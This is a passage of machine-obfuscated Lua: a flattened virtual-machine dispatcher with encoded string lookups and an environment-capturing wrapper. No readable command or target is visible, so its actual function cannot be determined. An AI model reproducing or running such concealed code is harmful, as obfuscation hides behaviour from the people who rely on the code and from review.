e=w()d=D[Q]Q=y(-125860+116319)C=d[Q]Q=w()h[Q]=C p=P(-184806+10936622,{e})u=w()C=V(1789015-1029184,{})h[u]=C C=false h[e]=C t=D[M]M=t(p)C=M and-743287+9988241 or-36769+14602078 d=M end end else if C<763704+12734391 then if C<-409133+13892415 then M=nil t=nil C=3740562-(-204006)u=nil else f=j(f)g=j(g)L=j(L)c=j(c)m=j(m)Z=nil E=j(E)C=-60770+11999951 end else if C<12871418-(-988479)then C=642676+12852520 h[B]=d else W=836666-836666 C=7034294-(-869179)X=#l Y=X==W end end end else if C<9760+16289412 then if C<15956881-690933 then if C<178790+14776848 then if C<-20193+14971155 then t=d M=y(250909-260456)d=D[M]H=y(-223116-(-213607))M=y(1028928+-1038481)p=y(534924-544433)C=d[M]M=w()h[M]=C d=D[p]p=y(-635421-(-625907))C=d[p]F=D[H]v=F K=C p=C C=F and 2450475-648692 or 9191417-555761 else s=65314+-65313 A=Z[s]U=A C=530224+554737 end else E=not m X=X+L Y=X<=W Y=E and Y E=X>=W E=m and E Y=E or Y E=1084673-701174 C=Y and E Y=14801189-569202 C=C or Y end else if C<-429293+16608735 then B=h[N[-67552-(-67554)]]Q=-637300+637493 k=B*Q B=-508080+21994125496499 d=k+B k=-577458+35184372666290 C=d%k h[N[450928-450926]]=C B=-45921+45922 k=h[N[-754612-(-754615)]]C=6767599-945469 d=k~=B else t=nil M=j(M)X=j(X)Q=j(Q)e=j(e)F=nil Q=nil t=y(-300532-(-290985))p=nil l=nil H=nil B=j(B)e=D[t]K=j(K)B=nil H=w()C=14165904-(-795193)v=j(v)Y=nil t=y(900028+-909534)u=j(u)p=y(-648921-(-639412))u=e[t]e=w()h[e]=u M=y(381601-391148)t=D[M]M=y(332058-341611)F={}v=y(-358763+349230)u=t[M]M=D[p]K=w()p=y(323296-332842)t=M[p]p=D[v]v=y(-688342-(-678837))M=p[v]p=801209+-801209 v=w()l={}h[v]=p p=-959358+959360 Y=-882939+882940 h[K]=p X=990015-989759 p={}h[H]=F F=1034368-1034368 W=X X=656244+-656243 L=X X=750839+-750839 m=L<X X=Y-L end end else if C<-502896+17021088 then if C<16498546-124132 then U=h[B]d=U C=U and 7661834-(-563185)or-692789+14257619 else Q=Q+e B=Q<=u M=not t B=M and B M=Q>=u M=t and M B=M or B M=3916247-(-243368)C=B and M B=16072715-(-481263)C=C or B end else if C<16268549-(-323434)then C=h[N[946493+-946483]]B=h[N[953150+-953139]]k[C]=B C=h[N[-522404-(-522416)]]B={C(k)}C=D[y(203942+-213468)]d={O(B)}else d=y(382318-391852)k=y(508607-518128)C=D[d]d=D[k]k=y(-965871-(-956350))D[k]=C k=y(-806775-(-797241))C=7696459-(-237735)D[k]=d k=h[N[338091-338090]]B=k()end end end end end end end C=#G return O(d)end,{},function(D,y)local O=Q(y)local o=function(o)return C(D,{o},y,O)end return o end,function(D,y)local O=Q(y)local o=function(...)return C(D,{...},y,O)end return o end return(e(13817862-919164,{}))(O(d))end)(getfenv and getfenv()or _ENV,unpack or table[y(896257-905788)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
